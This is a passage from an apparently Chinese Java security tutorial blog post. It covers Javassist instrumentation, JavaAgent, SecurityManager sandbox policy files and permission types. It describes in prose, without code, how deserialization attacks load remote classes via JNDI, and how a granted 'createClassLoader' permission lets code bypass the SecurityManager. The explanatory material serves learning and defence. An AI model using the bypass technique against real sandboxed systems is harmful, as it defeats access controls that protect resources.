classPool = ClassPool.getDefault();\n            CtClass ctClass = classPool.get(\"aop.demo.service.AopDemoServiceWithoutInterface\");\n            CtMethod ctMethod = ctClass.getDeclaredMethod(\"sayHelloFinal\");\n            ctMethod.insertBefore(\"{ System.out.println(\\\"start\\\");}\");\n            ctMethod.insertAfter(\"{ System.out.println(\\\"end\\\"); }\");\n            return ctClass.toBytecode();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return null;\n    }\n}\n```\n\n## JavaAgent\n\n光有Instrumentation接口还不够，如何将其注入到一个正在运行JVM的进程中去呢？我们还需要自定义一个Agent，借助Agent的能力将Instrumentation注入到运行的JVM中\n\nAgent是JVMTI的一种实现，Agent有两种启动方式：\n\n1. 一是随Java进程启动而启动，经常见到的java -agentlib就是这种方式；\n2. 二是运行时载入，通过attach API，将模块（jar包）动态地Attach到指定进程id的Java进程内。\n\n# SecurityManager沙箱分析\n\n## 简介\n\n安全管理器（SecurityManger）是为了保护JVM在运行有漏洞或恶意的代码不会破坏外部资源，这是api级别的，可自定义的安全策略管理器。\n\n安全管理器（SecurityManger）在java中的作用就是检查操作是否有权限执行，是java沙箱的基础组件。通过Java命令行启动的java应用程序，默认不启用沙箱。要启动沙箱，需要：\n\n```java\njava -Djava.security.manager <other args>\n```\n\n也可以指定策略文件：\n\n```java\njava -Djava.security.policy=<URL>\n```\n\n如果要求启动时只遵循一个策略文件，启动需要双等号，如下：\n\n```java\njava -Djava.security.policy==<URL>\n```\n\n还可以在代码中使用硬编码System.setSecurityManager()来启动安全管理器\n\n## 安全策略文件\n\n策略文件制定了具体的代码权限。可以使用jdk自带的policytool工具查看或编辑。\n\njava.policy有三个条目，每一条在java.policy文件中为一条grant记录，每一个grant记录含有一个codeBase（指定代码）及其permission（许可）：\n\n```\ngrant codeBase source { \n\tpermission permission_class_name ation;\n}\n```\n\n每一条grant记录遵循下面格式：\n\n* 以保留字“grant”开头，表示一条新的记录开始。\n* “permission”也是保留字，标记一个新的许可开始。\n* 每一个grant记录授予一个指定的代码（CodeBase）一套许可（Permissons）。\n* source指定目标类的位置\n* ation用于指定目标类拥有的权限\n\nsource三种通配符：\n\n1. directory/ 表示directory目录下所有.class文件，不包括.jar文件\n2. directory/* 表示directory目录下所有的.class及.jar文件\n3. directory/- 表示dierctory目录下的所有.class及.jar文件，包括子目录\n\n## 权限\n\n权限定义的格式包含三部分：权限类型、权限名和允许的操作。例：\n\n```\n// 权限类型\npermission java.security.AllPermission\n\n// 权限类型+权限名\npermission java.loang.RuntimePermission \"stopThread\";\n\n// 权限类型+权限名+允许的操作\npermission java.io.FilePermission \"/tmp/test\" \"read\"\n```\n\n所有权限列表\n\n|            | 类型                                | 权限名                                                   | 操作                   | 例子                                                         |      |\n| ---------- | ----------------------------------- | -------------------------------------------------------- | ---------------------- | ------------------------------------------------------------ | ---- |\n| 文件权限   | java.io.FilePermission              | 文件名（平台依赖）                                       | 读、写、删除、执行     | 允许所有文件的读写删除执行：permission java.io.FilePermission \"<< ALL FILES>>\", \"read,write,delete,execcute\"; |      |\n| 套接字权限 | java.net.SocketPermission           | 主机名:端口                                              | 接收、监听、连接、解析 | 允许实现所有套接字操作：permission java.net.SocketPermission \":1-\",\"accept,listen,connect,resolve\"; |      |\n| 属性权限   | java.util.PropertyPermission        | 需要访问的jvm属性名                                      | 读、写                 | 读标准java属性：permission java.util.PropertyPermission \"java.\",\"read\"; |      |\n| 运行时权限 | java.lang.RuntimePermission         | 多种权限名                                               | 无                     | 允许代码初始化打印任务：permission java.lang.RuntimePermission \"queuePrintJob\" |      |\n| AWT权限    | java.awt.AWTPermission              | 6种权限名                                                | 无                     | 允许代码充分使用test类：permission java.awt.AWTPermission \"createTest\";permission java.awt.AWTPermission \"readDisplayPixels\"; |      |\n| 网络权限   | java.net.NetPermission              | 3种权限名                                                | 无                     | 允许安装流处理器：permission java.net.NetPermission \"specifyStreamHandler\"; |      |\n| 安全权限   | java.security.SecurityPermission    | 多种权限名                                               | 无                     |                                                              |      |\n| 序列化权限 | java.io.SerializeablePermission     | 2种权限名                                                | 无                     |                                                              |      |\n| 反射权限   | java.lang.reflect.ReflectPermission | suppressAccessChecks（允许利用反射检查任意类的私有变量） |                        |                                                              |      |\n| 完全权限   | java.security.AllPermission         | 无（拥有执行任何操作的权限）                             |                        |                                                              |      |\n\n## SecurityManager的原理与影响\n\n一般API设计到安全管理器的原理：\n\n1. 请求java api\n2. java api使用安全管理器判断许可权限\n3. 通过则顺序执行，否则抛出Exception\n\n例如JDK源码中的FileInputStream类，如果开启沙箱，则安全管理器不是null，检查checkRead（name）。而checkRead方法则是依据访问控制策略的一个权限检查。\n\n![](/images/a1/6.png)\n\n###如何破坏反序列化漏洞\n\n对于java反序列对象漏洞利用来说，一般两种形式：\n\n1. 在classpath下寻找弱点jar包，通过gadget串联拼凑最终通过该反序列执行任意代码。 -- **这种场景实际利用困难，一方面适合的gadget不容易找，另一方面业界已经披露有问题的三方件，产品一般都已升级**\n2. 在classpath下寻找弱点jar包，结合**JDNI注入**，通过远程加载恶意类执行任意代码 -- **这种手法是目前更有效的一种方法**\n\n可以通过安全策略限制文件执行权限，导致rce失败。\n\n### 如何绕过SecurityManager\n\n如果policy中设置存在如下规则：\n\n```\npermission java.lang.RuntimePermission \"createClassLoader\";\n```\n\n则存在绕过可能性。\n\n原理：当我们拥有建立一个自己的ClassLoader的权限，我们完全可以在这个ClassLoader中建立自己的一个class，并赋予一个新的SecurityManager策略，这个策略也可以是null，及关闭整个java安全管理器。核心在ClassLoader存在一个方法叫defineClass，defineClass允许接受一个参数ProtectionDomain，我们能够自建一个ProtectionDomain将自己配置好的权限设置进去，define出来的class则拥有新的权限。\n\n\n\n**参考：**\n\n[https://www.cnblogs.com/coprince/p/8603492.html](https://www.cnblogs.com/coprince/p/8603492.html)\n\nhttps://segmentfault.com/a/1190000020248225?utm_source=tag-newest\n\nhttps://www.runoob.com/maven/maven-tutorial.html\n\nhttps://blog.csdn.net/belvine/article/details/89552524\n\n","tags":["JAVA","安全"],"categories":["JAVA安全教程"]}]